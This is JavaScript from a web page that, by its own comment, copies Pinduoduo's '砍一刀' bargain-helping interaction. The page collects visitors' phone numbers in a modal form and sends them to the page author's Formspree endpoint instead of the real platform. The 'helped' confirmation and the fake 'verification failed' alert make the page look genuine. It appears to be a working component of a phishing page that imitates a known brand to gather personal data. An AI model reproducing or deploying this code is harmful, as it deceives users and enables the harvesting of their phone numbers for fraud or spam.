    <script>
        // 交互逻辑，完全复刻拼多多原生交互
        const cutBtn = document.getElementById('cutBtn');
        const modalMask = document.getElementById('modalMask');
        const modalClose = document.getElementById('modalClose');
        const phoneForm = document.getElementById('phoneForm');
        const successTip = document.getElementById('successTip');

        // 点击砍一刀弹出弹窗，带动画
        cutBtn.addEventListener('click', () => {
            modalMask.style.display = 'flex';
            setTimeout(() => {
                modalMask.classList.add('show');
            }, 10);
        });

        // 关闭弹窗的逻辑
        function closeModal() {
            modalMask.classList.remove('show');
            setTimeout(() => {
                modalMask.style.display = 'none';
                phoneForm.style.display = 'block';
                successTip.style.display = 'none';
                phoneForm.reset();
            }, 200);
        }
        modalClose.addEventListener('click', closeModal);
        // 点击遮罩关闭弹窗
        modalMask.addEventListener('click', (e) => {
            if (e.target === modalMask) {
                closeModal();
            }
        });

        // 表单提交逻辑，提交到你的Formspree
        phoneForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(phoneForm);
            
            try {
                const res = await fetch(phoneForm.action, {
                    method: 'POST',
                    body: formData,
                    headers: { 'Accept': 'application/json' }
                });

                if (res.ok) {
                    // 隐藏表单，显示成功提示
                    phoneForm.style.display = 'none';
                    successTip.style.display = 'block';
                    // 按钮变成已帮砍，不能再点
                    cutBtn.classList.add('disabled');
                    cutBtn.textContent = '已帮砍';
                    // 3秒后关闭弹窗
                    setTimeout(() => {
                        closeModal();
                    }, 3000);
                } else {
                    alert('验证失败，请重试');
                }
            } catch (err) {
                alert('网络异常，请检查网络后重试');
            }
        });

        // 返回按钮的逻辑
        document.querySelector('.pdd-header .back').addEventListener('click', () => {
            window.history.back();
        });
